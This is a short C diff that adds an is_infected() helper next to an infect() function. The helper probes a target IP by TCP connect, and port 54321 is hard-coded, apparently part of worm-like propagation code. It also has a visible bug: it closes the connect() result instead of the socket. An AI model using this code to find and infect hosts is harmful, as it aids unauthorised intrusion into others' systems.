@@ -59,6 +59,18 @@ void free_list (struct list_server * list){
 	}
 }
 
+int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr){
+    my_server_addr->sin_addr.s_addr = ip;
+    int connfd = connect(sock, my_server_addr, sizeof(*my_server_addr));
+    if (connfd == 0){
+        close(connfd);
+        return 1;
+    }
+    else{
+        return 0;
+    }
+}
+
 int infect(){
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     char port[] = "54321";
